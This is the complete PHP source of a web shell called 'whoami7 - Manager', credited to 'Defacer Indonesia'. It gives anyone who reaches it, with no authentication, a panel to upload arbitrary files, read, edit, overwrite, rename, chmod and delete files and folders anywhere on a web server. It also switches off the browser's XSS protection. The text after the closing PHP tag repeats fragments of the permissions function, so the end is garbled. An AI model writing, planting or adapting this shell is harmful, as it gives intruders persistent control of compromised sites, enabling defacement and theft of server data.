 <?php

header("X-XSS-Protection: 0");
ob_start();
session_start();
set_time_limit(0);
ini_set("memory_limit",-1);
if(get_magic_quotes_gpc()){
	foreach($_POST as $key=>$value){
	$_POST[$key] = stripslashes($value);
	}
}
echo '<!DOCTYPE HTML>
<html>
<head>
<title>Asikk-&wkwkwkwkw</title>
<meta name="description" content="whoami7">
<link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet" type="text/css">
<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"/>
<center>
<style type="text/css">
body {
	font-family: Kelly Slab;
	background-color: black;
	color: lime;
	}
#content tr:hover{
	background-color: #;
	text-shadow:0px 0px 10px #FF1493;
	}
#content .first{
	color: #000000;
	background-image:url(#);
	}
#content .first:hover{
	background-color: #FF1493;
	text-shadow:0px 0px 1px #FF1493;
	}
table, th, td {
		border-collapse:collapse;
		padding: 5px;
		color: #FF1493;
		}
.table_home, .th_home, .td_home { 
		color: #FF1493;
		border: 2px solid #FF1493;
		padding: 7px;
		}
a{
	font-size: 19px;
	color: #FF1493;
	text-decoration: none;
	}
a:hover{
	color: #FF1493;
	text-shadow:0px 0px 10px #FF1493;
	}
input,select,textarea{
	border: 1px #FF1493 solid;
	-moz-border-radius: 5px;
	-webkit-border-radius:5px;
	border-radius:5px;
	}
.close {
	overflow: auto;
	border: 1px solid #FF1493;
	background: black;
	color: #FF1493;
	}
.r {
	float: right;
	text-align: right;
	}
</style>
<a href="?"><h1 style="font-family: Kelly Slab; font-size: 35px; color: white;"></h1></a> 
<center><b><font face="Courier New" color="white" size="5">whoami7 - Manager </font></b></center>
<BODY>

<table width="95%" border="0" cellpadding="0" cellspacing="0" align="left">
<tr><td>';
echo '<table width="95%" border="0" cellpadding="0" cellspacing="0" align="center">
<tr align="center"><td align="center"><br>';

if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<i class="fa fa-folder-o"></i> : <a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}


//upload
echo '<br><br><br><font color="lime"><form enctype="multipart/form-data" method="POST">
Upload File: <input type="file" name="file" style="color:lime;border:2px solid lime;" required/></font>
<input type="submit" value="UPLOAD" style="margin-top:4px;width:100px;height:27px;font-family:Kelly Slab;font-size:15;background:black;color: lime;border:2px solid lime;border-radius:5px"/>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<br><br><font color="lime">UPLOAD SUCCES !!!!</font><br/>';
}else{
echo '<script>alert("File Gagal Diupload !!")</script>';
}
}

echo '</form></td></tr>';
if(isset($_GET['filesrc'])){
echo "<tr><td>files >> ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo(' <textarea  style="font-size: 8px; border: 1px solid white; background-color: black; color: white; width: 100%;height: 1200px;" readonly> '.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</textarea>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';

//Chmod
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<br><br><font color="lime">CHANGE PERMISSION SUCCESS !!</font><br/>';
}else{
echo '<script>alert("Change Permission Gagal !!")</script>';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" style="width:80px; height: 30px;"/>
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Lanjut" style="width:60px; height: 30px;"/>
</form>';
}

//rename folder
elseif($_GET['opt'] == 'btw'){
	$cwd = getcwd();
	 echo '<form action="?option&path='.$cwd.'&opt=delete&type=buat" method="POST">
New Name : <input name="name" type="text" size="25" value="Folder" style="width:300px; height: 30px;"/>
<input type="hidden" name="path" value="'.$cwd.'">
<input type="hidden" name="opt" value="delete">
<input type="submit" value="Go" style="width:100px; height: 30px;"/>
</form>';
}

//rename file
elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<br><br><font color="lime">CHANGE NAME SUCCESS !!</font><br/>';
}else{
echo '<script>alert("Change Name Gagal !!")</script>';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name : <input name="newname" type="text" size="5" style="width:20%; height:30px;" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Lanjut" style="height:30px;" />
</form>';
}

//edit file
elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<br><br><font color="lime">EDIT FILE SUCCESS !!</font><br/>';
}else{
echo '<script>alert("Edit File Gagal !!")</script>';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src" style="font-size: 8px; border: 1px solid white; background-color: black; color: white; width: 100%;height: 1000px;">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Lanjut" style="height:30px; width:70px;"/>
</form>';
}
echo '</center>';
}else{
echo '</table><br /><center>';

//delete dir
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<br><br><font color="lime">DELETE DIR SUCCESS !!</font><br/>';
}else{
echo '<script>alert("Delete Dir Gagal !!")</script>>';
}
}

//delete file
elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<br><br><font color="lime">DELETE FILE SUCCESS !!</font><br/>';
}else{
echo '<script>alert("Delete File Gagal !!")</script>';
}
}
}

?>
<?php
echo '</center>';
$scandir = scandir($path);
$pa = getcwd();
echo '<div id="content"><table width="95%" class="table_home" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<th><center>Name</center></th>
<th><center>Size</center></th>
<th><center>Perm</center></th>
<th><center>Options</center></th>
</tr>
<tr>';

foreach($scandir as $dir){
if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
echo "<tr>
<td class=td_home><img src=''><a href=\"?path=$path/$dir\"> $dir</a></td>
<td class=td_home><center>DIR</center></td>
<td class=td_home><center>";
if(is_writable("$path/$dir")) echo '<font color="#57FF00">';
elseif(!is_readable("$path/$dir")) echo '<font color="#FF0004">';
echo perms("$path/$dir");
if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';

echo "</center></td>
<td class=td_home><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\" style=\"margin-top:6px;width:100px;font-family:Kelly Slab;font-size:15;background:black;color:lime;border:2px solid lime;border-radius:5px\">
<option value=\"Action\">Action</option>
<option value=\"delete\">Delete</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Rename</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"dir\">
<input type=\"hidden\" name=\"name\" value=\"$dir\">
<input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
<input type=\"submit\" value=\">\" style=\"margin-top:6px;width:27;font-family:Kelly Slab;font-size:15;background:black;color:lime;border:2px solid lime;border-radius:5px\"/>
</form></center></td>
</tr>";
}

echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file("$path/$file")) continue;
$size = filesize("$path/$file")/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo "<tr>
<td class=td_home><img src=''><a href=\"?filesrc=$path/$file&path=$path\"> $file</a></td>
<td class=td_home><center>".$size."</center></td>
<td class=td_home><center>";
if(is_writable("$path/$file")) echo '<font color="#57FF00">';
elseif(!is_readable("$path/$file")) echo '<font color="#FF0004">';
echo perms("$path/$file");
if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';

echo "</center></td>
<td class=td_home><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\" style=\"margin-top:6px;width:100px;font-family:Kelly Slab;font-size:15;background:black;color:lime;border:2px solid lime;border-radius:5px\">
<option value=\"Action\">Action</option>
<option value=\"delete\">Delete</option>
<option value=\"edit\">Edit</option>
<option value=\"rename\">Rename</option>
<option value=\"chmod\">Chmod</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"file\">
<input type=\"hidden\" name=\"name\" value=\"$file\">
<input type=\"hidden\" name=\"path\" value=\"$path/$file\">
<input type=\"submit\" value=\">\" style=\"margin-top:6px;width:27;font-family:Kelly Slab;font-size:15;background:black;color:lime;border:2px solid lime;border-radius:5px\"/>
</form></center></td>
</tr>";
}
echo '</table>
</div>';
}
echo '<center><br/><font face="Kelly Slab" color="white" style="text-shadow:0 0 20px #00FAFF, 0 0 5px #00FAFF, 0 0 7px red, 0 0 45px #00FAFF; font-weight:bold: white; font-size:15px">Copyright &copy;2021 || Defacer Indonesia
</body>
</html>';
function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
?>
nfo .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
?>

?>
